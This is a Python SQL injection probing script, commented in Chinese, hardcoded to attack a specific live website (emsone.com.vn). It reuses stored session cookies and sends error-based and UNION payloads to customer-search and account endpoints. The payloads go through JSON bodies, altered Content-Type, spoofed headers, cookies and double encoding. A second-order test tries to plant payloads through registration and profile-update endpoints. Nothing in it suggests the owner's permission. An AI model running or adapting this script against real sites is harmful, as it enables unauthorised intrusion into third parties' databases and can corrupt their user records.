#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
import urllib3
urllib3.disable_warnings()

class AdvancedSQLiTest:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_json_injection(self):
        """测试JSON格式SQL注入"""
        print("[*] 测试JSON格式SQL注入...")
        
        endpoints = [
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Account/JLogin',
        ]
        
        payloads = [
            {"id": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"},
            {"q": "1' UNION SELECT 'TEST'--"},
            {"search": "1' OR '1'='1"},
        ]
        
        for endpoint in endpoints:
            for payload in payloads:
                url = f"{self.base_url}{endpoint}"
                try:
                    r = self.session.post(url, json=payload, timeout=10)
                    if 'TEST' in r.text or 'XPATH' in r.text.upper():
                        print(f"    [!] JSON注入: {endpoint}")
                        print(f"        Payload: {payload}")
                except:
                    pass
    
    def test_content_type_bypass(self):
        """测试Content-Type绕过"""
        print("[*] 测试Content-Type绕过...")
        
        endpoint = '/Handle/SearchListCustomer'
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        content_types = [
            'application/x-www-form-urlencoded',
            'application/json',
            'text/plain',
            'application/xml',
            'multipart/form-data',
        ]
        
        for ct in content_types:
            headers = {'Content-Type': ct}
            data = {'q': payload}
            try:
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, headers=headers, timeout=10)
                if 'TEST' in r.text:
                    print(f"    [!] Content-Type绕过: {ct}")
            except:
                pass
    
    def test_header_injection(self):
        """测试Header注入"""
        print("[*] 测试Header注入...")
        
        endpoint = '/Handle/SearchListCustomer'
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        headers_list = [
            {'X-Forwarded-For': payload},
            {'X-Real-IP': payload},
            {'X-Originating-IP': payload},
            {'X-User-Id': payload},
            {'X-User-ID': payload},
            {'User-Id': payload},
        ]
        
        for headers in headers_list:
            try:
                r = self.session.get(f"{self.base_url}{endpoint}", headers=headers, timeout=10)
                if 'TEST' in r.text:
                    print(f"    [!] Header注入: {list(headers.keys())[0]}")
            except:
                pass
    
    def test_cookie_injection(self):
        """测试Cookie注入"""
        print("[*] 测试Cookie注入...")
        
        endpoint = '/Handle/SearchListCustomer'
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        # 修改Cookie
        self.session.cookies.set('user_id', payload)
        self.session.cookies.set('id', payload)
        self.session.cookies.set('userId', payload)
        
        try:
            r = self.session.get(f"{self.base_url}{endpoint}", timeout=10)
            if 'TEST' in r.text:
                print(f"    [!] Cookie注入有效")
        except:
            pass
    
    def test_second_order_injection(self):
        """测试二阶SQL注入"""
        print("[*] 测试二阶SQL注入...")
        
        # 先注册/更新数据
        register_data = {
            'MobileNumber': "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            'Email': "test@test.com",
        }
        
        endpoints = [
            '/Account/Register',
            '/Account/UpdateProfile',
            '/Account/ChangePassword',
        ]
        
        for endpoint in endpoints:
            try:
                r = self.session.post(f"{self.base_url}{endpoint}", json=register_data, timeout=10)
                # 然后查询
                r2 = self.session.get(f"{self.base_url}/Handle/SearchListCustomer?q=test", timeout=10)
                if 'TEST' in r2.text:
                    print(f"    [!] 二阶注入: {endpoint}")
            except:
                pass
    
    def test_union_with_encoding(self):
        """测试编码绕过Union"""
        print("[*] 测试编码绕过...")
        
        endpoint = '/Handle/SearchListProvince'
        
        # 双重编码
        payload = "1' UNION SELECT 'TEST'--"
        encoded_payload = urllib.parse.quote(urllib.parse.quote(payload))
        
        url = f"{self.base_url}{endpoint}?Type={encoded_payload}"
        try:
            r = self.session.get(url, timeout=10)
            if 'TEST' in r.text:
                print(f"    [!] 编码绕过成功")
        except:
            pass
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("高级SQL注入测试")
        print("="*60)
        
        self.test_json_injection()
        self.test_content_type_bypass()
        self.test_header_injection()
        self.test_cookie_injection()
        self.test_second_order_injection()
        self.test_union_with_encoding()
        
        print("\n[+] 测试完成")

if __name__ == "__main__":
    tester = AdvancedSQLiTest()
    tester.run_all()